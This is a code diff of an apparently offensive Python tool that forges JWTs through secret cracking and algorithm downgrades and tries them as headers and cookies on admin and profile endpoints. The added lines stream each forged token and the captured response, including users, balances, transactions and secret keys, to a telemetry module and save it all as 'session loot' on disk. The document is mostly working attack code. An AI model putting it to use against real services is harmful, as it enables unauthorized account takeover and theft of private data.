@@ -6,7 +6,7 @@ Features:
 - Cryptographic JWT secret dictionary cracking & algorithm downgrade attacks (RS256 -> HS256 & None)
 - Strict response schema validation (Zero false-positives: verifies JSON privilege objects, not static HTML text)
 - Differential content comparison against baseline unauthenticated responses
-- Zero-disk memory streaming & robust terminal color formatting
+- Automated immutable disk exfiltration of verified session loot (loot_output/)
 """
 import asyncio
 import sys
@@ -16,6 +16,10 @@ import hmac
 import hashlib
 import httpx
 from urllib.parse import urlsplit
+
+# Import centralized loot exfiltration and telemetry streaming
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 
 COMMON_SECRETS = [
     "secret", "password", "jwt_secret", "changeme", "admin123", 
@@ -74,7 +78,6 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
     target_endpoints = ["/admin", "/dashboard", "/api/admin", "/api/user/profile", "/api/v1/user/profile"]
 
     async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=8.0) as client:
-        # Capture unauthenticated baseline to eliminate static HTML false-positives
         log("[*] Establishing unauthenticated baseline responses for differential comparison...", "CYAN")
         baselines = await establish_baseline(client, base_url, target_endpoints)
 
@@ -106,12 +109,10 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
             for endpoint in target_endpoints:
                 url = f"{base_url}{endpoint}"
                 
-                # Multi-vector injection: Test both Bearer Auth headers and Session Cookie injection
                 headers_variants = [
                     {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                     {"X-Access-Token": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
                 ]
-                
                 cookies_variant = {"token": token, "session": token, "jwt": token}
 
                 for headers in headers_variants:
@@ -120,7 +121,6 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
                         status = response.status_code
                         body = response.text
                         
-                        # 1. Check if it's a generic SPA landing shell / login view
                         is_landing_shell = (
                             "<div id=\"root\"></div>" in body or 
                             "<div id=\"__next\"></div>" in body or 
@@ -129,28 +129,39 @@ async def run_session_hijack(target_host, port=None, use_ssl=None):
                             "sign in" in body.lower()
                         )
                         
-                        # 2. Differential analysis against baseline
                         baseline = baselines.get(endpoint, {"status": 404, "length": 0})
                         is_differential_match = (
                             status == 200 and 
                             not is_landing_shell and 
-                            abs(len(body) - baseline["length"]) > 50  # Must differ significantly from unauthenticated shell
+                            abs(len(body) - baseline["length"]) > 50
                         )
 
-                        # 3. Strict JSON Payload & Privilege Object Verification
                         has_elevated_json = False
+                        extracted_json_data = {}
                         try:
                             json_data = response.json()
                             if isinstance(json_data, dict):
-                                # Look for actual data keys indicating a true breach
+                                extracted_json_data = json_data
                                 if any(k in json_data for k in ["users", "admin", "balance", "transactions", "secret_key", "config"]):
                                     has_elevated_json = True
                         except Exception:
                             pass
 
-                        # True Positive Criteria: Must be HTTP 200, NOT a landing shell, and contain either elevated JSON or strict differential change
                         if (status == 200 and not is_landing_shell) and (has_elevated_json or is_differential_match):
                             log(f"[!!!] GENUINE BREACH CONFIRMED AT {endpoint} USING {vector_name} [!!!]", "RED")
+                            
+                            # STREAM LIVE TELEMETRY & PERSIST LOOT TO DISK IMMEDIATELY
+                            stream_proof("SESSION_HIJACK_BREACH", endpoint, {"vector": vector_name, "token": token}, body, extracted_json_data or {"status": status})
+                            save_session_loot(
+                                target=base_url,
+                                endpoint=endpoint,
+                                finding_type=f"SESSION_HIJACK_{vector_name.replace(' ', '_').upper()}",
+                                status=status,
+                                headers=dict(response.headers),
+                                body=body,
+                                extra_loot={"forged_token": token, "extracted_data": extracted_json_data}
+                            )
+
                             hijack_findings.append({
                                 "vector": vector_name,
                                 "endpoint": endpoint,
